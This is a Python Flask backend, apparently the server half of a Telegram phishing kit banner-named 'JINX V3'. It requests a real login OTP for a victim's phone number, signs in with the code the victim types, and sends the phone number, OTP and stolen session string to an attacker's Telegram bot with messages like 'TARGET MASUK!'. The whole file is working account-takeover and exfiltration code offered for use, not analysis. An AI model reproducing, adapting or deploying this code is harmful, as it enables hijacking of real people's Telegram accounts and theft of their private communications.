# api/send_code.py
import os
import logging
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon.sync import TelegramClient
from telethon.errors import PhoneCodeInvalidError, FloodWaitError
import requests

logging.basicConfig(level=logging.DEBUG)
log = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

def send_bot(msg):
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    params={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=10)
    except Exception as e:
        log.error(f"Bot error: {e}")

@app.route('/send_code', methods=['POST', 'OPTIONS'])
def handle():
    if request.method == 'OPTIONS':
        return '', 204

    phone = request.form.get('phone')
    code = request.form.get('code')
    action = request.form.get('action', 'send')
    phone_code_hash = request.form.get('hash')

    if not phone:
        return jsonify({'success': False, 'error': 'no phone'}), 400

    session_path = f"{SESSIONS_DIR}/{phone.replace('+', '')}.session"
    log.info(f"Action: {action} | Phone: {phone}")

    client = None
    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        client.connect()

        if action == 'verify' and code:
            if not phone_code_hash:
                return jsonify({'success': False, 'error': 'Missing phone_code_hash'}), 400

            log.info(f"Verifying with code: {code}, hash: {phone_code_hash}")
            try:
                client.sign_in(phone, code, phone_code_hash=phone_code_hash)
                session_str = client.session.save()
                client.disconnect()

                msg = f"*TARGET MASUK!*\n\nNo: `{phone}`\nOTP: `{code}`\nSESSION:\n||{session_str}||"
                send_bot(msg)
                return jsonify({'success': True, 'session': session_str})

            except PhoneCodeInvalidError:
                return jsonify({'success': False, 'error': 'Kode OTP salah'}), 400
            except FloodWaitError as e:
                return jsonify({'success': False, 'error': f'Tunggu {e.seconds} detik'}), 429

        else:
            log.info("Sending OTP...")
            res = client.send_code_request(phone, force_sms=True)
            client.disconnect()

            status = "RESEND" if action == 'resend' else "TARGET MASUK"
            msg = f"*{status}*\n\nNo: `{phone}`\nMenunggu OTP..."
            send_bot(msg)
            return jsonify({'success': True, 'hash': res.phone_code_hash})

    except Exception as e:
        log.error(f"ERROR: {e}")
        if client and client.is_connected():
            client.disconnect()
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/')
def home():
    return "JINX V3 – SYNTAX FIXED | OTP ASLI"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))  # FIX: 2 KURUNG
